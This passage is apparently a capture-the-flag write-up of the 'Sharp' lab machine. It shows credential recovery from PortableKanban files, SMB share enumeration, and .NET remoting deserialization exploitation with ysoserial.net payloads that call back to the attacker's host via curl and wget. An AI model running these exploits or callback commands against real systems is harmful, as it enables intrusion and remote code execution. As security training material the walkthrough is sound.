class="p">,</span><span class="nl">"Initials"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"Email"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="s2">"k+iUoOvQYG98PuhhRC7/rg=="</span><span class="p">,</span><span class="nl">"Role"</span><span class="p">:</span><span class="s2">"Admin"</span><span class="p">,</span><span class="nl">"Inactive"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637409769245503731</span><span class="p">},{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"0628ae1de5234b81ae65c246dd2b4a21"</span><span class="p">,</span><span class="nl">"Name"</span><span class="p">:</span><span class="s2">"lars"</span><span class="p">,</span><span class="nl">"Initials"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"Email"</span><span class="p">:</span><span class="s2">""</span><span class="p">,</span><span class="nl">"EncryptedPassword"</span><span class="p">:</span><span class="s2">"Ua3LyPFM175GN8D3+tqwLA=="</span><span class="p">,</span><span class="nl">"Role"</span><span class="p">:</span><span class="s2">"User"</span><span class="p">,</span><span class="nl">"Inactive"</span><span class="p">:</span><span class="kc">false</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637409769265925613</span><span class="p">}],</span><span class="nl">"ServiceMessages"</span><span class="p">:[],</span><span class="nl">"CustomFieldDescriptors"</span><span class="p">:[],</span><span class="nl">"MetaData"</span><span class="p">:{</span><span class="nl">"Id"</span><span class="p">:</span><span class="s2">"ffffffffffffffffffffffffffffffff"</span><span class="p">,</span><span class="nl">"SchemaVersion"</span><span class="p">:</span><span class="s2">"4.2.0.0"</span><span class="p">,</span><span class="nl">"SchemaVersionModified"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(1605380100000+0100)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"SchemaVersionModifiedBy"</span><span class="p">:</span><span class="s2">"e8e29158d70d44b1a1ba4949d52790a0"</span><span class="p">,</span><span class="nl">"SchemaVersionChecked"</span><span class="p">:</span><span class="s2">"</span><span class="se">\/</span><span class="s2">Date(-62135596800000-0000)</span><span class="se">\/</span><span class="s2">"</span><span class="p">,</span><span class="nl">"SchemaVersionCheckedBy"</span><span class="p">:</span><span class="s2">"00000000000000000000000000000000"</span><span class="p">,</span><span class="nl">"TimeStamp"</span><span class="p">:</span><span class="mi">637409769001918463</span><span class="p">}}</span><span class="w">
</span></pre></table></code></div></div><p>This file looked like the local data storage file, and was just a simple text document. I immediately picked out the words <code class="language-plaintext highlighter-rouge">EncryptedPassword</code> in the middle of it. There were two of them, one for <code class="language-plaintext highlighter-rouge">Administrator</code>, and one for <code class="language-plaintext highlighter-rouge">lars</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ diff ./kanban/PortableKanban.pk3 ./kanban/PortableKanban.pk3.bak
</pre></table></code></div></div><p>There was a backup of this file in the same directory, but it seemed to be exactly the same as the working file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ md5sum ./kanban/PortableKanban.pk3.bak
0e3d7c07174011699fa4e1d29f02662b  ./kanban/PortableKanban.pk3.bak
                                   
┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ md5sum ./kanban/PortableKanban.pk3    
0e3d7c07174011699fa4e1d29f02662b  ./kanban/PortableKanban.pk3
┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ cat ./kanban/PortableKanban.pk3.md5   
0e3d7c07174011699fa4e1d29f02662b
</pre></table></code></div></div><p>This was verified with the md5 hash of the files. I hoped that this was actual user data and not the demo data the User Guide mentioned.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-6-changes.png" alt="The changelog for the program shows the use of the md5 file" /></p><p>The changelog in the User Guide showed that the MD5 file was used to verify the integrity of the data file. If I had to modify the data file at some point I would need to be sure to recompute the hash as well.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ md5sum ./kanban/PortableKanban.pk3
5218fec7f1b20452ecc3458c3eefe5e2  ./kanban/PortableKanban.pk3
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ mv ./kanban/PortableKanban.pk3.md5 ./kanban/PortableKanban.md5.bak
                                                                                                       
┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ echo 5218fec7f1b20452ecc3458c3eefe5e2 &gt; ./kanban/PortableKanban.md5
</pre></table></code></div></div><p>Since the Administrator password was allowed to be blank, I deleted it from the file and recomputed the hash. I hoped that this would allow me to run the program to see what information I could find.</p><h3 id="running-portablekanbanexe">Running PortableKanban.exe</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp/kanban]
└─$ wine PortableKanban.exe
0009:err:mscoree:CLRRuntimeInfo_GetRuntimeHost Wine Mono is not installed
</pre></table></code></div></div><p>I got an error while running the program in Wine. It sounded to me like the program needed .Net to run.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-7-login.png" alt="Login window with the name Administrator and no password" /></p><p>Instead of trying to troubleshoot this I copied the folder over to a Windows VM and ran it there instead. I was able to login using the username Administrator with a blank password.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-8-kanban.png" alt="The kanban program didn't have a very informative interface" /></p><p>The application was pretty sparse, with a row of unlabled icons across the top and the label ‘Demo (1)’ on the current project.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-9-about.png" alt="An about page in the Portable Kanban program " /></p><p>I found an about page that showed version information for the program along with the names of the dependencies.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-10-lars-password.png" alt="Users tab with a table of user parameters from the pk3 file" /></p><p>I found a users tab that held the user parameter data I had seen from the User Guide. Since I was logged in as an administrator I was able to view the password in plain text. <code class="language-plaintext highlighter-rouge">lars</code>’ password was <code class="language-plaintext highlighter-rouge">G123HHrth234gRG</code>. Since I was able to modify users, I changed <code class="language-plaintext highlighter-rouge">lars</code> to be an administrator and logged out. Next I set the Administrator account’s password to the value I found it in and logged in as <code class="language-plaintext highlighter-rouge">lars</code>, hoping I could get the other password as well.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp/kanban]
└─$ mv ./PortableKanban.md5 ./PortableKanban.md5.bak2                                                 
┌──(zweilos㉿kali)-[~/htb/sharp/kanban]
└─$ md5sum ./PortableKanban.pk3
3f7b191b0281dd65ff31f1e77bec5cdb  ./PortableKanban.pk3                                              
┌──(zweilos㉿kali)-[~/htb/sharp/kanban]
└─$ echo 3f7b191b0281dd65ff31f1e77bec5cdb &gt; ./PortableKanban.md5
</pre></table></code></div></div><p>I made the modifications to the file, then recomputed the has again.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-11-admin-pass.png" alt="Both user's passwords were visible now" /></p><p>After logging again as <code class="language-plaintext highlighter-rouge">lars</code> I was now able to see both user’s passwords. The password for <code class="language-plaintext highlighter-rouge">Administrator</code> was <code class="language-plaintext highlighter-rouge">G2@$btRSHJYTarg</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ evil-winrm -u lars -p G123HHrth234gRG -i 10.10.10.219   

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError   

Error: Exiting with code 1
</pre></table></code></div></div><p>I tried logging in with <code class="language-plaintext highlighter-rouge">Evil-WinRM</code> using both passwords and both usernames but was not successful.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ smbmap -u lars -p G123HHrth234gRG -H 10.10.10.219
[+] IP: 10.10.10.219:445        Name: 10.10.10.219                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        dev                                                     READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        kanban                                                  NO ACCESS
</pre></table></code></div></div><p>However, I was able to enumerate shares again using the username <code class="language-plaintext highlighter-rouge">lars</code> and password <code class="language-plaintext highlighter-rouge">G123HHrth234gRG</code>. The user <code class="language-plaintext highlighter-rouge">lars</code> had read access to a new share called <code class="language-plaintext highlighter-rouge">dev</code> and to the <code class="language-plaintext highlighter-rouge">IPC$</code> share.</p><h3 id="smb-ipc-share">SMB /IPC$ Share</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ smbclient -U "lars" //10.10.10.219/IPC$/ G123HHrth234gRG
Try "help" to get a list of possible commands.
smb: \&gt; ls
NT_STATUS_INVALID_INFO_CLASS listing \*
</pre></table></code></div></div><p>Connecting to the <code class="language-plaintext highlighter-rouge">IPC$</code> share did not give me access to the filesystem at all.</p><h3 id="smb-dev-share">SMB /dev share</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ smbclient -U "lars" //10.10.10.219/dev/ G123HHrth234gRG
Try "help" to get a list of possible commands.
smb: \&gt; ls
  .                                   D        0  Sun Nov 15 06:30:13 2020
  ..                                  D        0  Sun Nov 15 06:30:13 2020
  Client.exe                          A     5632  Sun Nov 15 05:25:01 2020
  notes.txt                           A       70  Sun Nov 15 08:59:02 2020
  RemotingLibrary.dll                 A     4096  Sun Nov 15 05:25:01 2020
  Server.exe                          A     6144  Mon Nov 16 06:55:44 2020

                10357247 blocks of size 4096. 7418870 blocks available
smb: \&gt; tarmode
tarmode is now full, system, hidden, noreset, noverbose
smb: \&gt; recurse
smb: \&gt; prompt
smb: \&gt; mget ./*
getting file \Client.exe of size 5632 as Client.exe (20.5 KiloBytes/sec) (average 20.5 KiloBytes/sec)
getting file \notes.txt of size 70 as notes.txt (0.3 KiloBytes/sec) (average 10.7 KiloBytes/sec)
getting file \RemotingLibrary.dll of size 4096 as RemotingLibrary.dll (17.3 KiloBytes/sec) (average 12.7 KiloBytes/sec)
getting file \Server.exe of size 6144 as Server.exe (24.6 KiloBytes/sec) (average 15.6 KiloBytes/sec)
</pre></table></code></div></div><p>I connected to the dev share, and saw a few files. I exfiltrated these files to my computer and started to go through them to see what I had found.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ cat notes.txt 
Todo:
    Migrate from .Net remoting to WCF
    Add input validation
</pre></table></code></div></div><p>The file <code class="language-plaintext highlighter-rouge">notes.txt</code> only had a few lines in it. It was a todo list that mentioned that they were currently using .Net remoting and had yet to put in any input validation. Since I knew that the <code class="language-plaintext highlighter-rouge">RemotingLibrary.dll</code> was written in .net, I opened it in ILSpy to see if I could find anything useful.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-12-remoting.png" alt="A dissassembled view of the Remoting Library showing the .net version" /></p><p>There was no information to be found in the dll other than the .NET version of 4.5</p><div class="language-cs highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="k">internal</span> <span class="k">class</span> <span class="nc">Client</span>
<span class="p">{</span>
    <span class="k">private</span> <span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="c1">//IL_0000: Unknown result type (might be due to invalid IL or missing references)</span>
        <span class="c1">//IL_000b: Expected O, but got Unknown</span>
        <span class="n">ChannelServices</span><span class="p">.</span><span class="nf">RegisterChannel</span><span class="p">((</span><span class="n">IChannel</span><span class="p">)(</span><span class="kt">object</span><span class="p">)</span><span class="k">new</span> <span class="nf">TcpChannel</span><span class="p">(),</span> <span class="k">true</span><span class="p">);</span>
        <span class="n">IDictionary</span> <span class="n">channelSinkProperties</span> <span class="p">=</span> <span class="n">ChannelServices</span><span class="p">.</span><span class="nf">GetChannelSinkProperties</span><span class="p">((</span><span class="kt">object</span><span class="p">)(</span><span class="n">Remoting</span><span class="p">)</span><span class="n">Activator</span><span class="p">.</span><span class="nf">GetObject</span><span class="p">(</span><span class="k">typeof</span><span class="p">(</span><span class="n">Remoting</span><span class="p">),</span> <span class="s">"tcp://localhost:8888/SecretSharpDebugApplicationEndpoint"</span><span class="p">));</span>
        <span class="n">channelSinkProperties</span><span class="p">[</span><span class="s">"username"</span><span class="p">]</span> <span class="p">=</span> <span class="s">"debug"</span><span class="p">;</span>
        <span class="n">channelSinkProperties</span><span class="p">[</span><span class="s">"password"</span><span class="p">]</span> <span class="p">=</span> <span class="s">"SharpApplicationDebugUserPassword123!"</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>The code in the file <code class="language-plaintext highlighter-rouge">Server.exe</code> was also not very interesting, but the <code class="language-plaintext highlighter-rouge">Client.exe</code> held some useful information. Apparently the developer had left a debug hook in the application that I could connect to using the endpoint <code class="language-plaintext highlighter-rouge">"tcp://localhost:8888/SecretSharpDebugApplicationEndpoint")</code> on port 8888 of the local machine using the username <code class="language-plaintext highlighter-rouge">debug</code> and the password <code class="language-plaintext highlighter-rouge">SharpApplicationDebugUserPassword123!</code>. Now I needed to find a way to access this.</p><ul><li>https://www.codeproject.com/articles/29945/all-you-need-to-know-about-net-remoting<li>https://askubuntu.com/questions/841847/mono-package-for-wine-is-not-installed</ul><p>It looked like .Net remoting relies on an XML configuration that I did not have access to.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-14-server.png" alt="Some of the c sharp code revealing the port number 8888" /></p><p>I noticed that the server source code mentions that <code class="language-plaintext highlighter-rouge">rejectRemoteRequests</code> was set to “false” along with the port number 8888. I thought that maybe I could use this to connect without port forwarding or being on the local machine.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>8888/tcp open  storagecraft-image syn-ack StorageCraft Image Manager
</pre></table></code></div></div><p>I checked back to my nmap scan results and noticed that port 8888 was listed as open.</p><h3 id="port-8888">Port 8888</h3><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp/kanban]
└─$ telnet 10.10.10.219 8888                                                                       1 ⨯
Trying 10.10.10.219...
Connected to 10.10.10.219.
Escape character is '^]'.
debug
SharpApplicationDebugUserPassword123!
ls
dir
Connection closed by foreign host.
</pre></table></code></div></div><p>I tried connecting to port 8888 using the browser but it just timed out. I was able to connect to the port using telnet, but there was no banner and no commands seemed to do anything.</p><h3 id="exploiting-the-net-remotingservice">Exploiting the .Net RemotingService</h3><ul><li>https://github.com/tyranid/ExploitRemotingService</ul><p>I did some research on now to exploit the .Net remoting service and found one that someone had made in 2019. I hoped that it would still work against this configuration.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/sharp-15-Exploit.png" alt="The build environment showing the successfully compiled exploit and dependencies" /></p><p>I had to download and build the code using Visual Studio. I downloaded the development enviroment VM from Microsoft from <a href="https://developer.microsoft.com/en-us/windows/downloads/virtual-machines/">here</a>. This VM comes with a fully installed version of Visual Studio 2019 in a Windows 10 Enterprise enviroment. Perfect for doing testing in!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/markups/sharp-warning.svg" alt="warning about upgrading build enviroment for other people's projects" /></p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp]
└─$ wine msiexec /i ~/Downloads/wine-mono-6.1.1-x86.msi
</pre></table></code></div></div><p>Needed &gt;= .net 4.5 to run <code class="language-plaintext highlighter-rouge">ExploitRemotingService.exe</code> so I installed the newest for mono from their website.</p><ul><li>https://dl.winehq.org/wine/wine-mono/</ul><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>┌──(zweilos㉿kali)-[~/htb/sharp/Debug]
└─$ wine ExploitRemotingService.exe                    
Must specify a URI and command
ExploitRemotingService [options] uri command [command args]
Copyright (c) James Forshaw 2014

Uri:
The supported URI are as follows:
tcp://host:port/ObjName   - TCP connection on host and portname
ipc://channel/ObjName     - Named pipe channel

Options:

  -s, --secure               Enable secure mode
  -p, --port=VALUE           Specify the local TCP port to listen on
  -i, --ipc=VALUE            Specify listening pipe name for IPC channel
      --user=VALUE           Specify username for secure mode
      --pass=VALUE           Specify password for secure mode
      --ver=VALUE            Specify version number for remote, 2 or 4
      --usecom               Use DCOM backchannel instead of .NET remoting
      --remname=VALUE        Specify the remote object name to register
  -v, --verbose              Enable verbose debug output
      --useser               Uses old serialization tricks, only works on 
                               full type filter services
      --uselease             Uses new serialization tricks by abusing lease 
                               mechanism.
      --nulluri              Don't send the URI header to the server
      --autodir              When useser is specified try and automatically 
                               work out the installdir parameter from the 
                               server's current directory.
      --installdir=VALUE     Specify the install directory of the service 
                               executable to enable full support with useser
      --path=VALUE           Specify an output path to write the request data 
                               rather than to a channel.
  -h, -?, --help             

Commands:
exec [-wait] program [cmdline]: Execute a process on the hosting server
cmd  cmdline                  : Execute a command line process and display stdout
put  localfile remotefile     : Upload a file to the hosting server
get  remotefile localfile     : Download a file from the hosting server
ls   remotedir                : List a remote directory
run  file [args]              : Upload and execute an assembly, calls entry point
user                          : Print the current username
ver                           : Print the OS version
raw base64_object|file        : Send a raw serialized object to the service.
</pre></table></code></div></div><p>I was able to either send the connection through tcp port or named pipe. I seemed to have both at my disposal…</p><h3 id="using-a-windows-vm">Using a Windows VM</h3><p>After running into too many errors with <code class="language-plaintext highlighter-rouge">wine</code> and getting <code class="language-plaintext highlighter-rouge">.net</code> and <code class="language-plaintext highlighter-rouge">mono</code> to work, I decided just to move over to a Windows VM instead. I had a Windows developer image from Microsoft.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug&gt; ./ExploitRemotingService.exe tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint ver
Error, couldn't detect version, using host: 4.0.30319.42000
Detected version 4 server
</pre></table></code></div></div><p>The program seemed to be working. I added <code class="language-plaintext highlighter-rouge">-s</code> to put it in secure mode since I seemed to need to use a username and password</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug&gt; ./ExploitRemotingService.exe -s --user=debug --pass="SharpApplicationDebugUserPassword123!" tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint cmd whoami
Error, couldn't detect version, using host: 4.0.30319.42000
Detected version 4 server
System.Security.Authentication.InvalidCredentialException: The server has rejected the client credentials. ---&gt; System.ComponentModel.Win32Exception: The logon attempt failed
</pre></table></code></div></div><p>Adding the parameter <code class="language-plaintext highlighter-rouge">--ver=4</code> got rid of the “couldnt detect version” error, but I still</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug&gt; ./ExploitRemotingService.exe -s --user="debug" --pass="SharpApplicationDebugUserPassword123!" --ver=4 tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw
Must specify base64 encoded string or a file containing the raw data.
PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug&gt; ./ExploitRemotingService.exe -s --user="debug" --pass="SharpApplicationDebugUserPassword123!" --ver=4 tcp://10.10.10.219:8888/SecretSharpDebugApplicationEndpoint raw Y21kLmV4ZSAvYyB3aG9hbWk=
System.Runtime.Serialization.SerializationException: The input stream is not a valid binary format. The starting contents (in bytes) are: 63-6D-64-2E-65-78-65-20-2F-63-20-77-68-6F-61-6D-69 ...
</pre></table></code></div></div><p>After testing a lot of the different options and getting credentials rejected errors, I got a different error with the raw option. I tried base64 encoding <code class="language-plaintext highlighter-rouge">cmd.exe /c whoami</code> but it said the serialization wasnt a valid binary format</p><h3 id="ysoserial">ysoserial</h3><ul><li>https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817<li>https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net/<li>https://github.com/pwntester/ysoserial.net</ul><p>Some more research led to this GitHub page with a project that called itself:</p><blockquote><p>A proof-of-concept tool for generating payloads that exploit unsafe .NET object deserialization.</p></blockquote><p>Since this server relies on xml deserialization, and the <code class="language-plaintext highlighter-rouge">notes.txt</code> from earlier mentions that input sanitization is still a “todo”, this may work.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>PS C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release&gt; ./ysoserial.exe -f BinaryFormatter -g PSObject -o base64 -c "wget http://10.10.14.172:8090/" -t
AAEAAAD/////
</pre></table></code></div></div><p>Used <code class="language-plaintext highlighter-rouge">ysoserial.exe</code> to take my payload and make it a base64 serialized object</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>System.InvalidCastException: Unable to cast object of type 'System.Management.Automation.PSObject' to type 'System.Runtime.Remoting.Messaging.IMessage'.
   at System.Runtime.Remoting.Channels.CoreChannel.DeserializeBinaryRequestMessage(String objectUri, Stream inputStream, Boolean bStrictBinding, TypeFilterLevel securityLevel)
   at System.Runtime.Remoting.Channels.BinaryServerFormatterSink.ProcessMessage(IServerChannelSinkStack sinkStack, IMessage requestMsg, ITransportHeaders requestHeaders, Stream requestStream, IMessage&amp; responseMsg, ITransportHeaders&amp; responseHeaders, Stream&amp; responseStream)
</pre></table></code></div></div><p>Got back this error after running the exploit with this payload</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\Desktop\ExploitRemotingService-master\ExploitRemotingService\bin\Debug\Release</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\ysoserial.exe</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nx">BinaryFormatter</span><span class="w"> </span><span class="nt">-o</span><span class="w"> </span><span class="nx">base64</span><span class="w"> </span><span class="nt">-g</span><span class="w"> </span><span class="nx">TypeConfuseDelegate</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="s2">"cmd.exe /c curl http://10.10.14.172:8090/"</span><span class="w">
</span><span class="n">AAEAAAD/////</span><span class="w">
</span></pre></table></code></div></div><p>After a lot of trial and error, I came up with this working payload.</p><div class="language-cs highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">System</span><span class="p">.</span><span class="n">InvalidCastException</span><span class="p">:</span> <span class="n">Unable</span> <span class="n">to</span> <span class="n">cast</span> <span class="kt">object</span> <span class="n">of</span> <span class="n">type</span> <span class="err">'</span><span class="n">System</span><span class="p">.</span><span class="n">Collections</span><span class="p">.</span><span class="n">Generic</span><span class="p">.</span><span class="n">SortedSet</span><span class="err">`</span><span class="m">1</span><span class="p">[</span><span class="n">System</span><span class="p">.</span><span class="n">String</span><span class="p">]</span><span class="err">'</span> <span class="n">to</span> <span class="n">type</span> <span class="err">'</span><span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">Remoting</span><span class="p">.</span><span class="n">Messaging</span><span class="p">.</span><span class="n">IMessage</span><span class="err">'</span><span class="p">.</span>
   <span class="n">at</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">Remoting</span><span class="p">.</span><span class="n">Channels</span><span class="p">.</span><span class="n">CoreChannel</span><span class="p">.</span><span class="nf">DeserializeBinaryRequestMessage</span><span class="p">(</span><span class="n">String</span> <span class="n">objectUri</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">inputStream</span><span class="p">,</span> <span class="n">Boolean</span> <span class="n">bStrictBinding</span><span class="p">,</span> <span class="n">TypeFilterLevel</span> <span class="n">securityLevel</span><span class="p">)</span>
   <span class="n">at</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">Remoting</span><span class="p">.</span><span class="n">Channels</span><span class="p">.</span><span class="n">BinaryServerFormatterSink</span><span class="p">.</span><span class="nf">ProcessMessage</span><span class="p">(</span><span class="n">IServerChannelSinkStack</span> <span class="n">sinkStack</span><span class="p">,</span> <span class="n">IMessage</span> <span class="n">requestMsg</span><span class="p">,</span> <span class="n">ITransportHeaders</span> <span class="n">requestHeaders</span><span class="p">,</span> <span class="n">Stream</span> <span class="n">requestStream</span><span class="p">,</span> <span class="n">IMessage</span><span class="p">&amp;</span> <span class="n">responseMsg</span><span class="p">,</span> <span class="n">ITransportHeaders</span><span class="p">&amp;</span> <span class="n">responseHeaders</span><span class="p">,</span> <span class="n">Stream</span><span class="p">&amp;</span> <span class="n">responseStream</span><span class="p">)</span>
</pre></table></code></div></div><p>Using the base64 format I kept getting this error,</p><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\User\AppData\Local\Programs\Python\Python39</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">/python</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">http.server</span><span class="w"> </span><span class="nx">8090</span><span class="w">
